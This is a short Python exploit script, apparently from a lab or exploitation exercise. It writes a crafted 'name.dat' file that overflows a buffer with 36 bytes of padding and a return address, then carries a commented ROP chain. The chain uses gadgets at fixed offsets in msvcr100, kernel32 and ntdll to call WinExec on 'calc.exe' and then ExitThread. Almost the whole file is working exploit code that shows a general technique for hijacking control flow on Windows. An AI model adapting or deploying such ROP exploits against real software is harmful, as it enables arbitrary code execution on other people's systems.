import struct

def write_file(file_path):
	# non-zero bytes
	
	msvcr100 = 0x715e0000	# random since ASLR
	kernel32 = 0x75340000	# random since ASLR
	ntdll = 0x77a60000		# random since ASLR
	
	WinExec = kernel32 + 0x45390
	ExitThread = ntdll + 0x22940
	lpCmdLine = 0xffffffff
	uCmdShow = 0x01010101
	dwExitCode = 0xffffffff
	ret_for_ExitThread = 0xffffffff
	
	# for padding
	for_ebp = 0xffffffff
	for_ebx = 0xffffffff
	for_esi = 0xffffffff
	for_retn = 0xffffffff
	
	rop_chain = [
		msvcr100 + 0xa813f,		# add esp,24 # pop ebp # retn
#cmd:
		"calc",
		".exe",
#cmd+8:
		0xffffffff,				# clear to zero in runtime
#cmd+0c:
		WinExec,
		ExitThread,
#cmd+14:
		lpCmdLine,				# WinExec 1st param(calc in runtime)
		uCmdShow,				# WinExec 2nd param
		ret_for_ExitThread,		# no use
		dwExitCode,				# ExitThread 1st param
#cmd+24:
		for_ebp,
		kernel32 + 0x77342,		# push esp # pop esi # retn 
		# now esi = here
#here(cmd+2c):
		ntdll + 0x2265b,		# xchg eax,esi # add al,0 # retn
		# now eax = here
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_ebp,
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_ebp,
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_ebp,
		msvcr100 + 0x86b27,		# dec eax # retn
		msvcr100 + 0x86b27,		# dec eax # retn
		msvcr100 + 0x86b27,		# dec eax # retn
		# now eax = cmd+14
		ntdll + 0x9874f,		# mov edx,eax # mov eax,edx # pop ebp # retn
		for_ebp,
		# now eax = edx = cmd+14
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_ebp,
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_ebp,
		msvcr100 + 0x86b27,		# dec eax # retn
		msvcr100 + 0x86b27,		# dec eax # retn
		msvcr100 + 0x86b27,		# dec eax # retn
		msvcr100 + 0x86b27,		# dec eax # retn
		msvcr100 + 0x86b27,		# dec eax # retn
		msvcr100 + 0x86b27,		# dec eax # retn
		# now eax = cmd
		ntdll + 0x91a92,		# xchg eax,edx # retn
		# now eax = cmd+14, edx = cmd
		msvcr100 + 0xa84d3,	# mov dword ptr ds:[eax],edx # pop ebp # retn
		for_ebp,
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_ebp,
		msvcr100 + 0x86b27,		# dec eax # retn
		# now eax = cmd+0c
		ntdll + 0xbef6 		# xchg eax,esp # mov ch,0 # add dh,dh # retn
		# now esp = cmd+0c
	]
	
	rop_chain = ''.join([x if type(x) == str else struct.pack('<I', x) for x in rop_chain])
	
	with open(file_path, 'wb') as f:
		ret_eip = ntdll + 0xbefb	# retn
		name = 'a'*36+struct.pack('<I', ret_eip) + rop_chain
		f.write(name)

write_file(r'name.dat')
